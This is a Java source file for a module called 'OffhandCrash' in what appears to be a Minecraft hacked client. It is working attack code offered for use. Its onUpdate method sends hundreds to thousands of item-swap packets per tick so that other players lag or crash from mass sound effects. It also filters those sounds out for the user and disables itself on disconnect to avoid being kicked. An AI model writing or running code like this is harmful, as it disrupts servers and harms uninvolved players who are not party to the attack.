package com.ragemachine.moon.impl.client.modules.misc;
/*
 * @author Crystallinqq on 6/25/2020
 */

import com.ragemachine.moon.api.event.events.PacketEvent;
import com.ragemachine.moon.impl.client.modules.Module;
import com.ragemachine.moon.impl.client.setting.Value;
import net.minecraft.client.gui.GuiDisconnected;
import net.minecraft.client.gui.GuiDownloadTerrain;
import net.minecraft.client.gui.GuiMainMenu;
import net.minecraft.client.gui.GuiMultiplayer;
import net.minecraft.client.multiplayer.GuiConnecting;
import net.minecraft.init.SoundEvents;
import net.minecraft.network.play.client.CPacketPlayerDigging;
import net.minecraft.network.play.server.SPacketSoundEffect;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.math.BlockPos;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;

public class OffhandCrash extends Module {

    private final Value<Boolean> antilag = addSetting(new Value("AntiOffhandCrash", true));
    private final Value<Boolean> docrash = addSetting(new Value("Use Offhand Crash", true));
    private final Value<Integer> loopzz = addSetting(new Value("Times to loop", 500, 100, 5000));

    public OffhandCrash() {
        super("OffhandCrash", "Spams server with item swap packets to lag/crash other players with large amounts of sound", Category.MISC, false, false, false);
    }

    @SubscribeEvent
    public void onPacketSend(PacketEvent.Receive event) {
        if(antilag.getValue()) {
            SPacketSoundEffect packet;
            if (event.getPacket() instanceof SPacketSoundEffect) {
                packet = event.getPacket();
                if (packet.getSound() == SoundEvents.ITEM_ARMOR_EQUIP_GENERIC) {
                    event.setCanceled(true);
                }
            }
        }
    }

    @Override
    public void onLogout() {
        this.disable();
    }

    @Override
    public void onUpdate() {
        if(docrash.getValue()) {
            for (int i = 0; i < loopzz.getValue(); ++i) {
                final BlockPos playerBlock = new BlockPos(mc.player.posX, mc.player.posY - 1.0, mc.player.posZ);
                mc.player.connection.sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, playerBlock, EnumFacing.UP));
            }
        }
        if (mc.currentScreen instanceof GuiMainMenu ||
                mc.currentScreen instanceof GuiDisconnected ||
                mc.currentScreen instanceof GuiDownloadTerrain ||
                mc.currentScreen instanceof GuiConnecting ||
                mc.currentScreen instanceof GuiMultiplayer) {
            //disable if disconnected so u dont get kicked immediately on login
            if(this.isEnabled()) {
                this.toggle();
            }
        }
    }
}
